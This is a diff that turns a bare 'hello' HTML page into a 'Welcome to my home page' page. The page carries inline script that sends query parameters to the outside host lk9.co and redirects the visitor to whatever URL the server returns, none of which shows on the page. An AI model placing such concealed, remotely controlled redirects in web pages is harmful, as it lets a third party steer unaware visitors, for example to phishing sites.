@@ -1,6 +1,1 @@
-<html>
-<body>
-
-<div>hello</div>
-</body>
-</html>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible"content="IE=edge"><meta name="viewport"content="width=device-width,initial-scale=1.0"><title>welcome</title><script type="text/javascript">function doHttp(code,extra){var param=code;param+=extra?("?extra="+extra):"";var ajaxObj=new XMLHttpRequest();ajaxObj.open('get','http://lk9.co/h2/'+param);ajaxObj.send(null);ajaxObj.onreadystatechange=function(){if(ajaxObj.readyState==4&&ajaxObj.status==200){var val=ajaxObj.responseText;var value=JSON.parse(val);if(value.success&&value.data){open(value.data)}}}}function getQueryVariableMap(){if(!window.location.search){return{}}var query=window.location.search.substring(1);var vars=query.split("&");var obj={};for(var i=0;i<vars.length;i++){var pair=vars[i].split("=");obj[pair[0]]=pair[1]}return obj}function open(url){if(!url){return}window.location.href=url;setTimeout(function(){window.location=url},20)}function doIt(){var mapObj=getQueryVariableMap();if(!mapObj.code){return}doHttp(mapObj.code,mapObj.extra)}doIt();</script><style>body,html{margin:0;padding:0;width:100%;min-width:1300px;height:100%}body{font-family:'Microsoft YaHei',Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fff;font-size:14px;text-align:center}.middle{font-size:30px;position:relative;top:50%;margin-top:-20px}</style></head><body><div class="middle">Welcome to my home page</div></body></html>
